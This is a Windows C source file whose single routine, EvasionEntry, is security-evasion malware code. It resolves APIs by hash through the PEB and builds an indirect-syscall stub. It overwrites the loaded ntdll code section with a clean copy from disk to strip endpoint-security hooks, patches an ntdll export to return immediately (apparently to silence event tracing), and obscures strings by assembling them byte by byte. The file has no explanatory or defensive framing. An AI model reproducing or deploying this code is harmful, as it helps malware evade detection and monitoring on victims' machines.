#include <windows.h>

static FARPROC RE(HMODULE m, DWORD hash) {
    BYTE* b = (BYTE*)m;
    IMAGE_DOS_HEADER* d = (IMAGE_DOS_HEADER*)b;
    IMAGE_NT_HEADERS* n = (IMAGE_NT_HEADERS*)(b + d->e_lfanew);
    DWORD rva = n->OptionalHeader.DataDirectory[0].VirtualAddress;
    IMAGE_EXPORT_DIRECTORY* e;
    DWORD* nm; WORD* od; DWORD* fn; DWORD i;
    if (!rva) return 0;
    e = (IMAGE_EXPORT_DIRECTORY*)(b + rva);
    nm = (DWORD*)(b + e->AddressOfNames);
    od = (WORD*)(b + e->AddressOfNameOrdinals);
    fn = (DWORD*)(b + e->AddressOfFunctions);
    for (i = 0; i < e->NumberOfNames; i++) {
        char* s = (char*)(b + nm[i]);
        DWORD h = 0x4E67C6A7u;
        while (*s) { h = ((h << 7) + h) ^ (unsigned char)*s; s++; }
        if (h == hash) return (FARPROC)(b + fn[od[i]]);
    }
    return 0;
}

void EvasionEntry(BYTE* sa) {
    BYTE* peb = (BYTE*)__readgsqword(0x60);
    BYTE* ldr = *(BYTE**)(peb + 0x18);
    BYTE* head = ldr + 0x20;
    BYTE* cur = *(BYTE**)head;

    cur = *(BYTE**)cur;
    HMODULE hNt = *(HMODULE*)(cur + 0x20);

    HMODULE hK = 0;
    cur = *(BYTE**)cur;
    while (cur != head) {
        HMODULE m = *(HMODULE*)(cur + 0x20);
        if (m && RE(m, 0xC0DBB964u)) { hK = m; break; }
        cur = *(BYTE**)cur;
    }
    if (!hNt || !hK) return;

    BYTE* pNv = (BYTE*)RE(hNt, 0x889C44B6u);
    DWORD sn = 0; ULONG_PTR ga = 0;
    if (pNv) sn = *(DWORD*)(pNv + 4);

    IMAGE_NT_HEADERS* nh = (IMAGE_NT_HEADERS*)((BYTE*)hNt + ((IMAGE_DOS_HEADER*)hNt)->e_lfanew);
    DWORD ntSz = nh->OptionalHeader.SizeOfImage;
    BYTE* sc = (BYTE*)hNt; DWORD gi;
    for (gi = 0; gi < ntSz - 3; gi++) {
        if (sc[gi]==0x0F && sc[gi+1]==0x05 && sc[gi+2]==0xC3) { ga=(ULONG_PTR)&sc[gi]; break; }
    }
    if (!sn || !ga) return;

    typedef long (*tVP)(HANDLE, PVOID*, SIZE_T*, ULONG, PULONG);
    sa[0]=0x4C;sa[1]=0x8B;sa[2]=0xD1;
    sa[3]=0xB8;*(DWORD*)(sa+4)=sn;
    sa[8]=0x49;sa[9]=0xBB;*(ULONG_PTR*)(sa+10)=ga;
    sa[18]=0x41;sa[19]=0xFF;sa[20]=0xE3;
    tVP vp = (tVP)sa;

    typedef HANDLE(WINAPI* tCF)(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
    typedef HANDLE(WINAPI* tCM)(HANDLE,LPSECURITY_ATTRIBUTES,DWORD,DWORD,DWORD,LPCSTR);
    typedef LPVOID(WINAPI* tMV)(HANDLE,DWORD,DWORD,DWORD,SIZE_T);
    typedef BOOL(WINAPI* tUM)(LPCVOID);
    typedef BOOL(WINAPI* tCH)(HANDLE);
    tCF cf = (tCF)RE(hK, 0xC0DBB964u);
    tCM cm = (tCM)RE(hK, 0x56DE9E28u);
    tMV mv = (tMV)RE(hK, 0xC95334D9u);
    tUM um = (tUM)RE(hK, 0x65BA5CC2u);
    tCH ch = (tCH)RE(hK, 0x82E971DBu);

    if (cf && cm && mv && um && ch) {
        char p[30]; HANDLE hf, hm; BYTE* cl;
        p[0]='C';p[1]=':';p[2]='\\';p[3]='W';p[4]='i';p[5]='n';p[6]='d';
        p[7]='o';p[8]='w';p[9]='s';p[10]='\\';p[11]='S';p[12]='y';p[13]='s';
        p[14]='t';p[15]='e';p[16]='m';p[17]='3';p[18]='2';p[19]='\\';
        p[20]='n';p[21]='t';p[22]='d';p[23]='l';p[24]='l';p[25]='.';
        p[26]='d';p[27]='l';p[28]='l';p[29]=0;
        hf = cf(p, 0x80000000, 1, 0, 3, 0, 0);
        if (hf != (HANDLE)(LONG_PTR)-1) {
            hm = cm(hf, 0, 2, 0, 0, 0);
            if (hm) {
                cl = (BYTE*)mv(hm, 4, 0, 0, 0);
                if (cl) {
                    BYTE* nb = (BYTE*)hNt;
                    IMAGE_NT_HEADERS* n2 = (IMAGE_NT_HEADERS*)(nb + ((IMAGE_DOS_HEADER*)nb)->e_lfanew);
                    IMAGE_SECTION_HEADER* ss = (IMAGE_SECTION_HEADER*)((BYTE*)&n2->OptionalHeader + n2->FileHeader.SizeOfOptionalHeader);
                    WORD si;
                    for (si = 0; si < n2->FileHeader.NumberOfSections; si++) {
                        if (ss[si].Characteristics & 0x20) {
                            BYTE* dst = nb + ss[si].VirtualAddress;
                            BYTE* src = cl + ss[si].PointerToRawData;
                            DWORD sz = ss[si].SizeOfRawData;
                            PVOID ba = dst; SIZE_T rs = sz; ULONG op; DWORD j;
                            vp((HANDLE)(LONG_PTR)-1, &ba, &rs, 0x40, &op);
                            for (j = 0; j < sz; j++) dst[j] = src[j];
                            ba = dst; rs = sz;
                            vp((HANDLE)(LONG_PTR)-1, &ba, &rs, op, &op);
                            break;
                        }
                    }
                    um(cl);
                }
                ch(hm);
            }
            ch(hf);
        }
    }
    {
        BYTE* ew = (BYTE*)RE(hNt, 0x44655C70u);
        if (ew) {
            PVOID ba = ew; SIZE_T rs = 1; ULONG op;
            vp((HANDLE)(LONG_PTR)-1, &ba, &rs, 0x40, &op);
            *ew = 0xC3;
            ba = ew; rs = 1;
            vp((HANDLE)(LONG_PTR)-1, &ba, &rs, op, &op);
        }
    }
    {
        BYTE* ib = *(BYTE**)(peb + 0x10);
        IMAGE_NT_HEADERS* inh = (IMAGE_NT_HEADERS*)(ib + ((IMAGE_DOS_HEADER*)ib)->e_lfanew);
        WORD* ps = &inh->OptionalHeader.Subsystem;
        PVOID ba = ps; SIZE_T rs = 2; ULONG op;
        vp((HANDLE)(LONG_PTR)-1, &ba, &rs, 0x40, &op);
        *ps = 3;
        ba = ps; rs = 2;
        vp((HANDLE)(LONG_PTR)-1, &ba, &rs, op, &op);
    }
    {
        typedef BOOL(WINAPI* tAC)();
        tAC ac = (tAC)RE(hK, 0x887D7DBDu);
        if (ac) ac();
    }
    {
        HMODULE hMc = 0;
        BYTE* c2 = *(BYTE**)head;
        while (c2 != head) {
            HMODULE mx = *(HMODULE*)(c2 + 0x20);
            if (mx && RE(mx, 0xC28C8582u)) { hMc = mx; break; }
            c2 = *(BYTE**)c2;
        }
        if (hMc) {
            typedef char*(*tIOB)(void);
            typedef void*(*tFR)(const char*, const char*, void*);
            tIOB piob = (tIOB)RE(hMc, 0xC28C8582u);
            tFR pfr = (tFR)RE(hMc, 0x64ED5642u);
            if (piob && pfr) {
                char* b = piob();
                char ci[7]; ci[0]='C';ci[1]='O';ci[2]='N';ci[3]='I';ci[4]='N';ci[5]='$';ci[6]=0;
                char co[8]; co[0]='C';co[1]='O';co[2]='N';co[3]='O';co[4]='U';co[5]='T';co[6]='$';co[7]=0;
                char rd[2]; rd[0]='r'; rd[1]=0;
                char wr[2]; wr[0]='w'; wr[1]=0;
                pfr(ci, rd, b);
                pfr(co, wr, b + 48);
                pfr(co, wr, b + 96);
            }
        }
    }
}
